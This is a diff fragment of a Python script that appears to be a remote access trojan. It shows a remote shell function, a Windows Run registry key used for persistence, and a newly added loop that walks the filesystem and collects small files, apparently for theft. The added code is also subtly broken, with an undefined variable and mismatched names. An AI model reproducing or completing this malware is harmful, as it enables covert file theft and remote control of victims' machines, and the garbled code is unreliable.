@@ -44,8 +44,6 @@ def shell():
 		s.close()
 
 def main():
-	#screenGrab()
-	#file_extensions = ['.pdf','.docx','.xlfs','.ppsx'] #file extensions to be searched for and uploaded.
 	tempdir = '%TEMP%'
 	fileName = sys.argv[0]
 	run = "Software\Microsoft\Windows\CurrentVersion\Run"
@@ -53,8 +51,12 @@ def main():
 	shell()
 
 if __name__ == "__main__":
+	home = os.environ['HOME']
+	os.path.walk(root,librat.check_file_size,None)
+	args = []
+	os.path.walk(root,librat.check_file_size,arg)
+	for size,filename in arg:
+		if(size < 10000):
+			librat.collect_files(filename)
 	main()
 
-
-if __name__ == '__main__':
-    main()
